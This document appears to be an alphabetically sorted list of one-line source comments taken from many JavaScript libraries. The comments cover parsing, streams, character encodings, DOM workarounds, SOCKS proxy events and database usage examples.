// These options can be provided separately as readableXXX and writableXXX.
// These probers are owned by the group prober.
// These properties used to be assigned to each new object in the Lines
// These should be rejected in component builds but aren't.
// These tags are only valid with a few parents that have special child
// These two are populated during finalization.
// These two fields are used by the DOM and ART diffing algorithms
// These types are unprintable because they serve as abstract
// These types check the underlying [[Class]] attribute of the given
// Theta
// They are lazy loaded in `iconv.getCodec` from `encodings/index.js`.
// They are optimized for boyer-moore parsing.
// They are shared across all instances of localForage.
// They are sorted in order.
// They will have gone through all possible matchers
// This MUST check exactly for undefined. You can not change it to !part.filename.
// This accepts a class that receives the tag string. This is a catch all
// This accepts a keyed object with classes as values. Each key represents a
// This accepts a text component class that takes the text string to be
// This allows multiple encodings of a language to share one frequency table.
// This allows us to avoid the explosion that occurs if you try to add nwmatcher to a document that is not yet
// This also verifies only a single &#x27;done&#x27; event is emitted
// This also works for queries that use comparison operators
// This also works with the $in and $nin operator
// This block becomes the previous block
// This can be replaced with a WeakMap once they are implemented in
// This can happen if `PerMessageDeflate#cleanup()` is called at the wrong
// This can lead to leaky behavior if the user retains a reference to the request object.
// This check is needed until node.js 12 is required
// This child node falls completely after the comment.
// This child node falls completely before the comment.
// This closure is intentional to hide _context and bridge since the allow to access the sandbox directly which is unsafe.
// This code is duplicated because extracting it away
// This code runs if there were any errors
// This code runs once the value has been loaded
// This code was originally written by Brian White (mscdex) for the io.js core querystring library.
// This constructor gets overridden by mocks. The argument is used
// This core module of AST types captures ES5 as it is parsed today by
// This could be > 0xFF because of astral characters.
// This does not run on PhantomJS < 2.0.
// This element was passed in a valid location.
// This ensures `util.promisify` works as it does for native `fs.read`.
// This error was fatal
// This error was thrown as a convenience so that you can use this stack
// This event is fired when the SOCKS server has accepted an incoming connection on the newly bound port.
// This event is fired when the SOCKS server has started listening on a new UDP port for UDP relaying.
// This event is fired when the SOCKS server has started listening on a new port for incoming connections.
// This example uses `seq` function to avoid overnesting and error
// This example works the same way with $addToSet
// This expression is here for better compressibility (see addClass)
// This fails because the `this.squareExponent` expression in the square
// This file contains Unicode properties extracted from the ECMAScript
// This file defines the main parser interface. The library also comes"
// This file describes the package to typescript.
// This file was generated. Do not modify manually!
// This follows what Chrome does.
// This for-in loop skips the holes of the sparse array. The order of
// This function assumes the string has already been percent encoded
// This function is based on https://github.com/Constellation/iv Engine
// This function is passed to string.replace(re[t.HYPHENRANGE])
// This function is used recursively from
// This function is used to raise exceptions on parse errors. It
// This function terminates when one of the following is true:
// This function tries to parse a single expression at a given
// This function uses `eval` (non-lexical) to produce such a
// This function uses the graceful-fs shared queue
// This function will give good results on real Error objects with stacks; poor ones otherwise
// This generates a 50 character boundary similar to those used by Firefox.
// This handles more types than `getPropType`. Only used for error messages.
// This has a complexity linear to the value of the code. The
// This has a few false positives w/r/t empty components.
// This has been commented out as it never seems to run. This is because
// This has to be done before localforage
// This implementation (a modified version of the SheetJS version) has been optimized
// This implementation of ReactPerf is going away some time mid 15.x.
// This index will be parsed back out below.
// This information was lost
// This is (almost) directly from Node.js utils
// This is *not* part of the readable stream interface.
// This is RegExp
// This is a bit of a hack since we construct an object with an arbitrary key only to dereference it later
// This is a brutally ugly hack to make sure that our error handler
// This is a fallback implementation in case the first one does
// This is a hack to make sure that our error handler is attached before any
// This is a method property
// This is a shortcut to avoid jQuery.event.remove's overhead
// This is a test mapping which maps functions from two different files
// This is adapted from https://github.com/normalize/mz
// This is added from the lookahead token.
// This is against the CSSOM draft spec:
// This is based on John Freeman's implementation.
// This is browser-only functionality. Node side is no-op.
// This is done later on
// This is essential when multiple graceful-fs instances are
// This is for 2.2.x only
// This is intentionally an invariant that gets caught. It's the same
// This is just one way to calculate confidence. It works well for me.
// This is likely caused since the host.Promise.prototype.then cannot use the VM Proxy object.
// This is modified from Mozilla Reflect.parse test suite (the file is located
// This is not an XSS hole but instead a potential CSS injection issue
// This is only here for backwards compatibility.
// This is probably bad practice. Consider warning here and
// This is relevant for synchronous Transform streams
// This is simpler than it sounds :)
// This is temporarily available for custom components that are not string
// This is the expected size (bytes) of the custom auth response from the proxy server.
// This is the function that is called to fetch the next token. It
// This is the important part!
// This is the only way to test support for the `wheel` event in IE9+.
// This is the part where you do stuff!
// This is the remote ip and port of the SOCKS proxy that is now accepting incoming connections.
// This is the remote ip and port that connected to the SOCKS proxy on the newly bound port.
// This is the remote port on the SOCKS proxy server to send UDP frame packets to.
// This is to test IE's treatment of not explicitly
// This is used by Reflect test suite to match a syntax tree.
// This is used in testing by future versions
// This is used to modify the delegate.
// This is useful to see why you're not getting the expected encoding.
// This kind of manipulation should seem familiar if you've used Esprima or the
// This leaf is also the root
// This legacy usage is in the process of being purged.
// This local field is used by Babel/Acorn. It should not technically
// This logic can technically be fooled if the node has parentheses
// This looks DOM specific but these are actually isomorphic helpers
// This makes MP more suitable to write-only use cases.
// This matches the property of native CompositionEventInterface.
// This may go away when https://github.com/mozilla/localForage/issues/168
// This means that if you have a file entry, followed by another"
// This method is designed to be overridden by subclasses that need to
// This method will be called for any node whose type is a subtype of
// This method will return documentElement in the following cases:
// This might not apply to all properties...*
// This module provides an alternative parser (`parse_dammit`) that"
// This module was originally created so that Recast could add its own
// This new executor is ready if we don't use persistence
// This node is also the root
// This object is reused in hasOpeningParen and hasClosingParen to avoid
// This object is used as prototype for any node created by a builder.
// This object will be used as the prototype for Nodes when creating a
// This one is used internally
// This only makes the test faster without relying on arbitrary timeouts
// This probably shouldn't be used publicly.
// This prober doesn't actually recognize a language or a charset.
// This property will be overridden as true by individual Def instances
// This queue can be shared by multiple loaded instances
// This registry keeps track of wrapper classes around native tags.
// This reverse insertion sort almost always takes constant
// This script converts for and do-while loops into equivalent while loops.
// This script should echo the contents of the given file without
// This script should reprint the contents of the given file without
// This should be inside a try catch
// This should be the ip and port of the expected client that will be sending UDP frames to the newly opened UDP port on the server.
// This should be the ip and port of the expected client that will connect to the SOCKS proxy server on the newly bound port.
// This should fail with an exception
// This should match resultList.length and markupList.length when
// This should not be named `constructor` since this may not be the function
// This step is already done.
// This supertype is shared/abused by both def/babel.js and
// This support function is only executed once so no memoizing is needed.
// This tag allow us to uniquely identify this as a React Element
// This test asserts that Stream.prototype.pipe does not leave listeners
// This test is executed only once but we still do memoizing
// This test is important because it can catch bugs other tests can't
// This test verifies that stream.unshift(Buffer(0)) or 
// This tests concurrency issues
// This timeout sets the amount of time to wait *between* bytes sent
// This trades a zero-byte read() syscall for a stat
// This transport only deals with cross domain requests
// This traversal is only concerned with Function nodes that have
// This validation code was written based on the HTML5 parsing spec:
// This way, back-pressure is actually determined by the reading side,"
// This will be a valid blob URI for an <img> tag.
// This will be called when it's time to send the custom auth handshake. You must return a Buffer containing the data to send as your authentication.
// This will force localStorage as the storage
// This will only penalize the array argument path.
// This will output `1`.
// This will propagate through error event
// This will return one of the above types based on the passed in string
// This will throw if it's invalid anyway
// This will throw if radio buttons rendered by different copies of React
// This will use a different driver order.
// This would be a good time to rethrow if any of the event handlers threw.
// This would be easier to follow with a .once() handler
// ThisExpression nodes in nested scopes don't count as `this`
// Three dot-separated numeric identifiers.
// Three-byte code
// Throughout this file we use Object.defineProperty to prevent
// Throw INVALID_CHARACTER_ERR exception here -- won't be hit in the tests.
// Throw an exception
// Throw an exception because of the token.
// Throw exception; should not be hit in tests
// Throw if the compiler is unknown.
// Throw this early
// Throws AbortRequest exception.
// Throws ReferenceError: process is not defined
// Thus-far undefined exports.
// Tilde ranges.
// Time since last uuid creation (in msecs)
// Time to dust off the old binary search robes and wizard hat.
// Timeout
// Timeout for the socket to be returned from the callback
// Timeout has already handled all callbacks
// Timing values will all be relative to startTime (by comparing to startTimeNow
// To change this to 0 to always get something or any other value that can
// To disallow parenthesized identifier via `this.toAssignable()`.
// To disallow trailing comma via `this.toAssignable()`.
// To extract it current and last mapping is used.
// To fix https://github.com/acornjs/acorn/issues/575
// To know if global events are to be dispatched
// To know if the callbacks have already been called at least once
// To raise SyntaxError if 'arguments' exists in the initializer.
// To remove extensions
// To sum up all of the above, the Hebrew probing mechanism knows about two"
// To work around this, on Windows systems, we rename the file and then"
// Toggle individual class names
// Toggle strict mode. Re-reads the next number or string to please
// Toggle whole class name
// Token scopes
// Token-specific context update code
// Tokens ahead
// Top of the tree. This node must not be part of a React tree (or is
// Top-level should never reach here.
// Total characters encountered
// Track the input node that has focus.
// Track unmatched elements for set filters
// Track whether we've ever handled a keypress on the space key.
// Trailing `$` or `$(?:)` (handles /x cruft)
// Transform dot notation to bracket notation
// Translate the old options to the new Resolver functionality.
// Transpose lanes
// Traverse and find all local identifiers in this closure first to
// Traverse iconv.encodings to find actual codec.
// Traverse its children
// Traverse nodes deeper into the trie.
// TravisCI seem to work fine though.
// Treat all other whitespace like ' '.
// Treat each array item as a scalar.
// Treat non-entity sequences as regular text.
// Tree traversing
// Trie root is decodeTables[0].
// Trigger any bound ready events
// Trigger bitmask: & 1 for native handlers; & 2 for jQuery (always true)
// Trim leading whitespace.
// Trim out all falsy values from an array.
// Trim the selector passed to compile
// Trim trailing white space.
// Trivial case: no characters to skip.
// True if the error was already emitted and should not be thrown again
// Trust units reported by jQuery.css
// Try convertible dataTypes
// Try default character for this sequence
// Try first to convert to a string. This is good as fast path
// Try getting the data from the backup website
// Try getting the data from the first website
// Try it out
// Try prefixed name followed by the unprefixed name
// Try start flowing on next tick if stream isn't explicitly paused
// Try the string as a key before any manipulation
// Try to find dashed key if it exists (gh-2779)
// Try to find string literal.
// Try to generate a nicer error message.
// Try to get the last modified date via the LIST command (uses
// Try to minimize operations if there is only one selector in the list and no seed
// Try to parse all remaining chars.
// Try to shortcut find operations (as opposed to filters) in HTML documents
// Try with different concurrency values to see how this actually
// Trying to use the custom `instanceof` for Writable here will also break the
// Tunnel HTTPS by default. Allow the user to override this setting.
// Turn off finishing flag
// Turn the JS String into a real async function instance
// Two documents were inserted in the database
// Two elements created in two different places should be considered
// Two possible strategies.
// Two-byte code
// Type 1: In-memory only datastore (no need to load the database)
// Type 2: Persistent datastore with manual loading
// Type 3: Persistent datastore with automatic loading
// Type 4: Persistent datastore for a Node Webkit app called 'nwtest'
// Type Annotations
// Type annotations
// Type definitions for TweetNaCl.js
// Type definitions for xmlbuilder
// Type selector
// Type-convert; drop leading zero
// Type-convert; drop leading zeros
// TypeError: Converting circular structure to JSON
// TypeError: process.exit is not a function
// TypeScript
// TypeScript compiled
// TypedArray. First we separate out the type of data we're dealing
// Types are exported only once they have been finalized.
// Types can be a map of types/handlers
// Typescript
// Typical Distribution Ratio about 25% of Ideal one, still much higher than RDR"
// Typical Distribution Ratio about 25% of Ideal one, still much higher that RDR"
// Typical Distribution Ratio"
// Typical Distribution Ratio, 25% of IDR"
// U+002F SOLIDUS (/)
// U+0030 DIGIT ZERO (0) to U+0039 DIGIT NINE (9)
// U+003E is '>'
// U+0041 LATIN CAPITAL LETTER A to U+005A LATIN CAPITAL LETTER Z
// U2FsdGVkX1+iX5Ey7GqLND5UFUoV0b7rUJ2eEvHkYqA=
// UCS2-LE
// UDF
// UDF OTH ASC ASS ACV ACO ASV ASO
// UNLESS it was limited by another range in the other direction.
// URI to convert to a file path');
// URIs
// URL without anti-cache param
// URLs on Windows. Tests can now be run with `npm test`.
// USE OR OTHER DEALINGS IN THE SOFTWARE.
// UTF-16 Decoding
// UTF-16 Encoding
// UTF-16 represents each of Surrogate Pair by 2-bytes
// UTF-16BE BOM
// UTF-16LE BOM
// UTF-7-IMAP codec.
// UTF-8
// UTF8 escape
// Uint8Array and we cannot patch key functions since then.
// Uint8Array with 32-byte public key
// Uint8Array with 32-byte secret key
// Uint8Array with 64-byte secret key
// Un-match failing elements by moving them back to matcherIn
// Uncomment this test if future XRegExp fixes it for Safari.
// Uncomment this test if future XRegExp fixes it for old Firefox.
// Undo swap from last round
// Unexpected continuation byte
// Unhandled 'error' event
// UnhandledPromiseRejectionWarning: TypeError: Method Promise.prototype.then called on incompatible receiver [object Object].
// Unicode chars including trailing whitespace
// Unicode mapping (http://www.unicode.org/Public/MAPPINGS/OBSOLETE/EASTASIA/OTHER/BIG5.TXT) is said to be wrong.
// Unicode new line characters after \ get removed from output in both
// Unicode ranges in regular expressions so we
// Unicode v8.0.0 NonAsciiIdentifierPart:
// Unicode v8.0.0 NonAsciiIdentifierStart:
// UnicodePropertyName ::
// UnicodePropertyName `=` UnicodePropertyValue
// UnicodePropertyValue ::
// UnicodePropertyValueExpression ::
// Unimplemented: <iframe srcdoc>
// Unique ID creation requires a high quality random # generator.  In node.js
// Unique ID creation requires a high quality random # generator.  In the
// Unique for each copy of jQuery on the page
// Universalify async methods:
// Universe
// Unknown char.
// Unless required by applicable law or agreed to in writing, software"
// Unlinks on Windows are not atomic.
// Unlisted TLD.
// Unlisted tld.
// Unmask DB
// Unmount children that are no longer present.
// Unpad
// Unpad data
// Unset styles on `lastProp` but not on `nextProp`.
// Unshift should *always* be something directly out of read()
// Unsigned Integers
// Unwind the scanner before the lookahead token.
// Unwrap any wrapped objects.
// Update `lastIndex` before `_mountIndex` gets unset by unmounting.
// Update `lastIndex` before calling `replacement`.
// Update counters
// Update function for both resolve and progress values
// Update global variables
// Update heights
// Update information about previous labels on this node
// Update neighbors
// Update parent
// Update special based on newly reset type
// Update state
// Update styles that changed since `lastProp`.
// Update the datafile
// Update the dom using the root
// Update the hash
// Update this array if you add/rename/remove files in this directory.
// Update with any zlib constants that are added or changed in the future.
// Update working variables
// Updating documents
// Uppercase the type
// Upserting a document
// Url cleanup var
// Usage: node detectnestedternary.js /path/to/some/directory
// Usage: node findbooleantrap.js /path/to/some/directory
// Use .style if available and use plain properties where available.
// Use GB18030 algorithm to find character(s) to write.
// Use IE sourceIndex if available on both nodes
// Use OR instead of AND as the element is not visible if either is true
// Use Object.defineProperties here to be able to
// Use `WebSocket#terminate()` and not `WebSocket#close()`. Delay should be
// Use `_.noConflict` to remove Lodash from the global object.
// Use `__proto__` if available
// Use `parser.help()` for formatted options help.
// Use `util.types` for Node.js 10+.
// Use a SOCKSv4a proxy
// Use a SOCKSv5h proxy
// Use a `switch` statement to work with class constructors. See
// Use a closure to provide a true imperative API for synchronous stores.
// Use a comparator function to figure out the smallest index at which
// Use a sourceURL for easier debugging.
// Use a stripped-down indexOf as it's faster than native
// Use an HTTP or HTTPS proxy
// Use another array so that we don't test pointer equality
// Use backslashes to treat delimiters as plain text.
// Use cssHook if its there.
// Use custom template delimiters.
// Use data converter to retrieve json after script execution
// Use decode trie to recursively fill out encode tables.
// Use default tree adapter for parsing
// Use first extension as default
// Use for Develop
// Use getAttributeNode to fetch booleans when getAttribute lies
// Use htmlparser2 tree adapter with SerializerStream
// Use integer dirruns iff this is the outermost matcher
// Use jQuery.extend here to allow modification of coordinates argument (gh-1848)
// Use native DOM manipulation to avoid our domManip AJAX trickery
// Use native `RegExp`
// Use native conversion when possible
// Use node-qunit to run the tests.
// Use onreadystatechange to replace onabort
// Use previously-cached element index if available
// Use proper attribute retrieval(#12072)
// Use same guid so caller can remove using origFn
// Use source `argPos` if available.
// Use source `arity` if one is not provided.
// Use source `ary` if it's smaller.
// Use source `func` and merge bitmasks.
// Use source `thisArg` if available.
// Use step hook for back compat.
// Use string for doubling so we don't accidentally see scale as unchanged below
// Use textContent for elements
// Use the Element Traversal API if available.
// Use the `click` event to detect changes to checkbox and radio inputs.
// Use the `imports` option to import `jQuery` as `jq`.
// Use the `sourceURL` option to specify a custom sourceURL for the template.
// Use the `source` property to inline compiled templates for meaningful
// Use the `variable` option to ensure a with-statement isn't used in the compiled template.
// Use the active box-sizing model to add/subtract irrelevant styles
// Use the already-created iframe if possible
// Use the default value.
// Use the dot-notation to match fields in subdocuments
// Use the dot-notation to navigate arrays of subdocuments
// Use the first identity optimization if possible
// Use the fix-ed jQuery.Event rather than the (read-only) native event
// Use the handy event callback
// Use the in-order predecessor
// Use the in-order predecessor (no need to randomize since we actively rebalance)
// Use the in-order successor
// Use the native method if available
// Use the new custom inspection symbol to add the custom inspect function if
// Use the original fragment for the last item
// Use the other root
// Use the same loop as above to seek `elem` from the start
// Use this until a test is added to Modernizr
// Use typeof to avoid zero-argument method invocation on host objects (#15151)
// Use types.builders to build a variable declaration of the form
// Use utf8 for decoding.
// Use webcrypto if available
// Use: /(^|\n)(?! )[^\n]+\n\n(?!\s*$)/
// Used by Esprima
// Used by Esprima.
// Used by async unpack to avoid clobbering paths in use,"
// Used by jQuery.camelCase as callback to replace()
// Used for iframes
// Used in checkLVal* and declareName to determine the type of a binding
// Used in conjunction with userId for user/pass auth for SOCKS5 proxies.
// Used to create a custom walker. Will fill in all missing node
// Used to handle egde case when token context could not be inferred correctly in tokenize phase
// Used to kill infinite recursion during XRegExp construction
// Used to read escaped characters
// Used to signal to callers of `readWord1` whether the word
// Used to signify the start of a potential arrow function
// Used to store ancestor hierarchy in top level callback
// Useful for temporary DOM ids.
// User is trying to bind() an autobound method; we effectively will
// Using $exists
// Using $in. $nin is used in the same way
// Using $regex with another operator
// Using XRegExp.union safely rewrites backreferences in `left` and `right`
// Using [\s\S] instead of . because js doesn't support the
// Using `str.slice(match.index)` rather than `match[0]` in case lookahead allowed
// Using a projected array
// Using a shortcut to install all optional features
// Using a shortcut to uninstall all optional features
// Using a sparse unique index
// Using a unique constraint with the index
// Using an array-specific comparison function
// Using named capture and flag x (free-spacing and line comments)
// Using object-notation will just replace the top-level field
// Using regular expressions with basic querying
// Using the following algorithm:
// Utility Functions
// Utility functions
// VML cannot correctly render a line if the width is less than 1px.
// Validate SocksClientChainOptions
// Validate SocksClientOptions
// Validate and sanitise input.
// Validate custom auth (if set)
// Validate domain name and throw if not valid."
// Validate pattern
// Validate proxies
// Validate proxies (length)
// Validates as many continuation bytes for a multi-byte UTF-8 character as
// Values: >=  0 -> unicode character code. can be > 0xFFFF
// Var-style binding
// Variations:"
// Various other blob bugs exist in Chrome v37-42 (inclusive)."
// Various parts of our code (such as ReactCompositeComponent's
// Vendor-prefix box-sizing
// Verify elements have a name (`attr.name`) and are not disabled (`:disabled`)
// Verify ending.
// Verify that getAttribute really returns attributes and not properties
// Verify that there is an actual destination to break or
// Very common: ( and ) and ;
// Very hacky. This is necessary to avoid http-parser leaks.
// Very small angles produce an unexpected result because they are
// Very small probability of conflict
// Virtually remove support for the drivers.
// Visitor methods return false to indicate that they have handled
// WALK: a.js : original a
// WALK: b.js : original b
// WALK: c.js : original c
// WARNING! WILL LOSE DATA!
// WHATWG crypto RNG - http://wiki.whatwg.org/wiki/Crypto
// W[i] = gamma0 + W[i - 7] + gamma1 + W[i - 16]
// Wait 100ms before performing the update
// Wait until an `EventPluginOrder` is injected.
// Walk GF(2^8)
// Walk down the tree looking for a discrepancy
// Walk in lockstep until we find a match.
// Walk up the tree until we find an ancestor whose DOM node we have cached.
// Walk up the tree until we find an ancestor whose instance we have cached.
// Want to be able to visit Property Nodes.
// Warn about using preserveTimestamps on 32-bit node
// Wasn't a variable length
// Watch for a new set of requests
// We accept any tag to be rendered but since this gets injected into arbitrary
// We add the dataType to the list if needed
// We add the generated code until the first mapping
// We allow auto-mocks to proceed as if they're returning null.
// We allow this because of a bug in IE8/9 that throws an error
// We allow trailing commas
// We also implement a workaround for non-visible tags disappearing into
// We also need to ignore callbacks in componentWillMount. See
// We also use the url parameter if available
// We are in the case where the node to delete has two children
// We are in the middle of the sequence
// We are over limit so we'll add it to the queue.
// We assume environment is node.js
// We assume target like following script
// We assume that it's the callback
// We assume the child nodes are in the same order as the child instances.
// We can choose to record those bytes as well and analyse the character once it
// We can fire global events as of now if asked to
// We can not use setNoDelay with HTTP/2.
// We can push more data if we are below the highWaterMark.
// We can&#x27;t depend on mime module to be consistent with this
// We can't be completely sure that this 'async' token is
// We can't use the default browserify vm shim because it doesn't work in a web worker.
// We cannot use original function as it doesn't handle BOM-s.
// We check if result is undefined first because that
// We check only the type of some members of ESParser.
// We currently don't have a way to track moves here but if we use iterators
// We deal with groups in the next pass
// We decode base64.
// We do it this way so that there are no more arguments in the function.
// We don't buffer chunks, we always parse them and either create an"
// We don't index documents that don't contain the field if the index is sparse
// We don't know the order in which docs wil be inserted but we ensure correctness by testing both sort orders
// We don't need an array for one selects
// We don't want exception behavior to differ between dev and prod.
// We eschew Sizzle here for performance reasons: http://jsperf.com/getall-vs-sizzle/2
// We found a component instance.
// We generally want to terminate all variable declarations with a
// We have already handled mixins in a special case above.
// We have enough bytes -> detect endianness.
// We have everything we need
// We have processed all mappings.
// We have tests that rely on errors being emitted
// We have to break on the first error
// We have to check the lowercase version also because the Document feature
// We have to close these tags to support XHTML (#13200)
// We have to do FilterExpr before LocationPath because otherwise
// We have to do another pass to ensure that there are not duplicate
// We have to pre-define these values for FF (#10227)
// We initialize the default updater but the real one gets injected by the
// We limit zlib concurrency, which prevents severe memory fragmentation"
// We loop through options so we don't overwrite existing config
// We may want to extend this logic for similar errors in
// We mostly implement W3C recommendation: https://www.w3.org/TR/encoding/#gbk-encoder
// We must always have either seed elements or outermost context
// We need a small value here
// We need more bytes to use space heuristic (see below)
// We need null here if data is undefined
// We need to check if there is someone still listening to
// We need to defer via nextTick because if .destroy(err) is
// We need to reinsert the doc so that we keep the collection's size at n
// We need to select the fastest one that works in this environment.
// We need to select the fastest one that works in this environment. 
// We need to subtract the time taken by one insert to get the time actually taken by one remove
// We only are interested in the *last* %c
// We output strings.
// We reached the end of the DOM children without finding an ID match.
// We save the initial value so that `ReactDOMComponent` doesn't update
// We should always get a number back from opacity
// We should only tell the proxy we support user/pass auth if auth info is actually provided.
// We stand on a space - a word just ended
// We support Browserify by skipping automatic module discovery and requiring modules directly.
// We trim replace any line endings (e.g. `\r` or `\r\n` with `\r\n`) to guarantee consistency across platforms
// We use a .js file because otherwise we can't browserify this. (brfs is unusable due to lack of ES2015 support)
// We use a Grunt task to make this safe for IE and some
// We use a dedicated iterator instead of the `i` variable below
// We use attributes for everything SVG so let's avoid some duplication and run
// We use node.js internal decoder. Its signature is the same as ours.
// We use this for POS matching in `select`
// We warn in this case but don't throw. We expect the element creation to
// We waste 1 space.
// We were (vacuously) able to reprint all the comments!
// We will actually insert twice as many documents
// We're already connected
// We're checking for boxSizingReliableVal here instead of pixelMarginRightVal
// We're currently unmounting this child in ReactMultiChild; skip it.
// We're done with this property
// We're in direct mode.
// We're in the sequence.
// We're probably calling from enqueueCallback. We don't want to warn
// We're waiting for it.
// We've got lead surrogate.
// We've got trail surrogate.
// Web Worker
// WebIDL requires DOMStrings to just be converted using ECMAScript
// WebKit Bug 13343 - getComputedStyle returns wrong value for margin-right
// WebSocket endpoint for the proxy to connect to
// Webkit & Blink performance suffers when deleting properties
// Webkit bug: https://bugs.webkit.org/show_bug.cgi?id=29084
// Webkit offers a very useful `textInput` event that can be used to
// Webkit/Opera - :checked should return selected option elements
// Well-formed entity (ending was found).
// What works now:
// When (erroneously) writing two adjacent tags like
// When set to a number limits the number of selections to this count
// When the pretty printer encounters a string instead of an
// When the reference is an element of an array.
// Where object last appeared in the ref tree
// Where to grab the headings to build the table of contents.
// Where to render the table of contents.
// Whether callbacks should fire when initializing dropdown values
// Whether dropdown should always open in one direction
// Whether dropdown should check whether it is on screen before showing
// Whether remote name/value pairs should be stored in sessionStorage to allow remote data to be restored on page refresh
// Whether selection should occur automatically when keyboard shortcuts used
// Whether to automatically observe changes with Mutation Observers
// Which Unicode version should be used?
// Which headings to grab inside of the contentSelector element.
// While the output is causally related to the input, it's not a"
// While user keyboard layout determines the actual meaning of each
// Whitespace-only lines don't tell us much about the likely tab
// Why even bother with asserts?
// Will be falsy for windows that have closed
// Will be overridden after an instance lazily calls scanScope.
// Will come out as undefined if no prefix was found
// Will conflict with doc3
// Will emit error event
// Will not actually modify the document but will take the same time
// Will not be saved
// Will throw an error
// Will violate the constraint (first try)
// Will violate the constraint (second try)
// Win1255Model.
// Windows can EPERM on stat.  Life is suffering.
// Windows can't fsync (FlushFileBuffers) directories. We can live with this as it cannot cause 100% dataloss
// Windows-1255 language model
// Wire up auto-binding
// With a Promise:
// With a balanced tree
// With an options object
// With an options string
// With an unbalanced tree
// With limit
// With named capture and flag x
// With parser
// With pos and sticky
// With the help of bind we can attach a context to the iterator before
// With this insertion order the tree is well balanced
// Without parser
// Work with a copy of dataTypes in case we need to modify it for conversion
// Workaround failure to string-cast null input
// Working variables
// Working varialbes
// Works with Callbacks:
// Works with Promises:
// Would need to escape `removeFlags` if this was public
// Wrap help description normally.
// Wrap simple expression bodies into a block
// Writable.
// Write Values
// Write all other elements of the chunk to the table.
// Write beginning of the sequence.
// Write buffer value
// Write direct character
// Write direct chars until '&'
// Write direct chars until '+'
// Write direct chars.
// Write the new Pack stream starting there.
// Write them
// Write value
// Write was successful
// Write-Output $ACWD$TAB$ADRIVERS$TAB$AUNAME$TAB$AUSER;
// Wrong
// X-Requested-With header
// X9ECParameters
// XHTML parsers do not magically insert elements in the
// XML allows all manner of ridiculous numbers and digits.
// XML types that nobody cares about or needs to print.
// XMLElement:
// XMLNode:
// XOR DB and dbMask together
// XOR DB and dbMask together to get the original data block.
// XOR DB and dbMask together.
// XOR and encrypt
// XOR blocks
// XOR intermediate with block
// XOR keys with pad constants
// XOR maskedSeed and seedMask together to get the original seed.
// XOR seed and seedMask together.
// XPathResultType
// XRegExp.exec gives you named backreferences on the match result
// XRegExp.replace allows named backreferences in replacements
// XRegExp.union safely merges strings and regexes into a single pattern
// XXX (@Qix-) should we be logging these?
// XXX Temporary. Will be removed in the next major release.
// XXX Values with \n in them will fail this.
// XXX remove in v8 or beyond
// XXX split the path
// XXX: This shares a lot in common with extract.js
// XXX: a small timeout seemed necessary otherwise FTP servers
// XXX: agent.callback() is an agent-base-ism
// XXX: file:// URIs and absolute paths lead to unexpected behavior for
// XXX: get the type ('symlink' or 'junction') for windows
// XXX: non-documented `http` module API :(
// XXX: what we supposed to do here?
// You can also deep-compare objects. Don't confuse this with dot-notation!
// You can also pass forward and return specific backreferences
// You can also use it in a Cursor way but this syntax is not compatible with MongoDB
// You can even store binary data from an AJAX request.
// You can insert multiple pieces of data for the same key
// You can issue commands right away
// You can jump to a given area."
// You can sort in reverse order like this
// You can unset nested fields with the dot notation of course
// You could also do something like:
// You may obtain a copy of the License at
// You may specify a parent. This makes it scroll down to the parent."
// You need to load each database (here we do it asynchronously)
// You understand how this works!
// ZIP64 Zip64 end of central directory locator
// ZIP64 end of central directory record
// ZIP64 format
// Zero length arguments are considered not equal.
// Zero pad the rest
// Zip together multiple lists into a single array -- elements that share
// [
// [ reject_list | resolve_list ].disable; progress_list.lock
// [Gaia](https://github.com/mozilla-b2g/gaia).
// [\S\s]* matches zero or more of any character
// []
// [api]: https://developer.mozilla.org/en-US/docs/SpiderMonkey/Parser_API"
// [arg2]: '#{dbname}'
// [dammit]: acorn_loose.js"
// [even number].5; round down (i.e. floor)
// [ghbt]: https://github.com/marijnh/acorn/issues"
// [ghbt]: https://github.com/ternjs/acorn/issues"
// [opp]: http://en.wikipedia.org/wiki/Operator-precedence_parser"
// [the Python documentation](http://docs.python.org/library/functions.html#range).
// [walk]: util/walk.js
// [{type: 'Number'}]
// \
// \ (backslash)
// \0 is not octal escape sequence
// \B is allowed in default scope only
// \b \B
// \g \h \. \# etc
// \p{Assigned} is equivalent to \p{^Cn}
// \p{^Any} compiles to [^\u0000-\uFFFF]; [\p{^Any}] to []
// \r is normalized out by HTMLTextAreaElement#value.)
// \uFEFF has the potential advantage of being zero-width/invisible.
// ]
// ]]
// ^
// ^1.2.0 --> >=1.2.0 <2.0.0-0
// ^1.2.3 --> >=1.2.3 <2.0.0-0
// ^= $= *= operators bugs with empty values (Opera 10 / IE8)
// _
// _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /
// _Clipboard.pop() }; all item
// _DOM_IDL_
// __proto__ as an own property. Object.getOwnPropertyDescriptor() works.
// __webpack_public_path__
// _bufferToString just like in LocalStorage
// _deserialize just like in LocalStorage
// _id is always indexed and since _ids are generated randomly the underlying
// _pendingStateQueue which will ensure that any state updates gets
// _renderValidatedComponent) assume that calls to render aren't nested;
// _serialize just like in LocalStorage
// _sort default to true but otherwise can be a function or boolean
// _supports: function() { return true; }
// _transform does all the work.
// _win.win.maximize();
// `
// `'data'` event.
// `._connecting` was the old property which was made public in node v6.1.0
// `/u` flag.
// `1.2.3 - 1.2.4` => `>=1.2.3 <=1.2.4`
// `<!--`
// `> 1.2.3 < 1.2.5` => `>1.2.3 <1.2.5`
// `Array.prototype.sort`. This makes sense because C++ will likely remain
// `BigInt(value)` throws syntax error if the string contains numeric separators.
// `INFLATING`
// `ReactServerRenderingTransaction` instead. This option is here so that it's
// `ReactTextComponent` checks it in `mountComponent`.`
// `WHERE id = ?`. This is the most efficient way I can think to implement
// `^ 1.2.3` => `^1.2.3`
// `_.map`.
// `__generatedMappings` and `__originalMappings` are arrays that hold the
// `_generatedMappings` is ordered by the generated positions."
// `_originalMappings` is ordered by the original positions."
// `_processChunk()` adds an 'error' listener. If we don't remove it
// `_writableState` that would lead to infinite recursion.
// `a ?? b` as per https://github.com/babel/babylon/pull/761/files
// `a?.b` as per https://github.com/estree/estree/issues/146
// `allowEmpty` can be turned on to allow subsequent commas with
// `allowReserved` to enforce them. When this option has the
// `appendChild(node)`. (Using `undefined` is not allowed by all browsers so
// `array`
// `basicLength` is the number of basic code points.
// `buffer` is defined in the parent scope and used in a closure it exists for the life of the Request.
// `buffer` is defined in the parent scope and used in a closure it exists for the life of the request.
// `charCode` is the result of a KeyPress event and represents the value of
// `class { get #a(){}; static set #a(_){} }` is also conflict.
// `class` and `function` keywords push new context into this.context.
// `clock_seq_hi_and_reserved` (Per 4.2.2 - include variant)
// `clock_seq_low`
// `document.write` implemented using `documentWrite`
